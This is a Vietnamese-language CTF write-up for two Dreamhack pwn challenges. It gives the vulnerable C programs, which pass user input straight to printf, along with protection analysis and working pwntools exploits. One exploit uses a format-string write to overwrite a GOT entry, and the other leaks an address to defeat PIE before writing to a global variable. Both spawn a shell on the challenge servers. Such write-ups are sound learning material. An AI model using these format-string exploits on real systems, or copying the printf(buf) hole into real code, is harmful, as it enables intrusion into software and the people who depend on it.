Basic_exploitation_002
 -
*
```sh
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>


void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}


void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell() {                    #có get_shell
    system("/bin/sh");
}

int main(int argc, char *argv[]) {

    char buf[0x80];

    initialize();

    read(0, buf, 0x80);
    printf(buf);              # Lỗi chuỗi định dạng

    exit(0);                  # ghi đè địa chỉ của ghet_shell vào đây 
}
```
* <img width="473" height="74" alt="image" src="https://github.com/user-attachments/assets/961f287e-59fa-4891-b2dd-72c3cc55a6e1" />
 - Bài này `no canary` , `no PIE`, `Partial RELRO` nên ta có thể ghi đề vào địa chỉ của hàm `exit` trong `got`
*  <img width="495" height="76" alt="image" src="https://github.com/user-attachments/assets/b865ac33-53a4-4b33-97ab-26dc41206823" />
 - Ta có đc địa chỉ của `got_exit` và `get_shell` , ta thấy 2 byte cao là giống nhau nên chỉ cần quan tâm đến 2 byte thấp và ghi đè 2 byte thấp của `exit_got` bằng `get_shell`
*
```sh
from pwn import * 

p = remote("host3.dreamhack.games" ,21293)
e = ELF("./basic_exploitation_002")

exit_got = e.got["exit"]
get_shell = e.symbols["get_shell"]

under = get_shell & 0xffff   # lấy 2 byte thấp get_shell

payload = f"%{under}c%5$hn".encode().ljust(16,b"A")   # %34313c%5$hnAAAA , ghi ra 34313 dấu cách sau đó lấy con số đó cho vào đối số 5, căn chỉnh cho đủ 16 byte(4 đối số đầu)
payload += p32(exit_got)  # đây là đối số thứ 5 trên stack và ghi đề 2 byte thấp để trở thành địa chỉ của get_shell 

p.send(payload)
p.interactive()
```
fsb_overwrite
 -
*
```sh
// Name: fsb_overwrite.c
// Compile: gcc -o fsb_overwrite fsb_overwrite.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void get_string(char *buf, size_t size) {
  ssize_t i = read(0, buf, size);
  if (i == -1) {
    perror("read");
    exit(1);
  }
  if (i < size) {
    if (i > 0 && buf[i - 1] == '\n') i--;
    buf[i] = 0;
  }
}

int changeme;

int main() {
  char buf[0x20];
  
  setbuf(stdout, NULL);
  
  while (1) {
    get_string(buf, 0x20);
    printf(buf);
    puts("");
    if (changeme == 1337) {
      system("/bin/sh");
    }
  }
}
```
* <img width="443" height="91" alt="image" src="https://github.com/user-attachments/assets/80decfea-77b0-454d-a73b-8c6343596b07" />
 -  `Full RELRO` -> ko thể sử dụng ghi đè địa chỉ got
 -  `PIE enabled` -> địa chỉ thay đối nên ta cần leak ra đc địa chỉ cơ sở
* 
```sh
#!/usr/bin/env python3 

from pwn import * 

def slog(n, m): return success(': '.join([n, hex(m)]))
p = remote("host3.dreamhack.games" ,20681)

e=elf = ELF('./fsb_overwrite')

p.sendline(b'%17$p')   # Leak dia chi o doi so thu 15
leaked = int(p.recvline()[:-1], 16)
code_base = leaked - 0x1293
changeme = code_base + e.symbols['changeme']

slog('code_base', code_base)
slog('changeme', changeme) 

payload = b'%1337c'
payload += b'%8$n'
payload += b'A'*6
payload = payload + p64(changeme)

p.sendline(payload)
p.interactive()
```
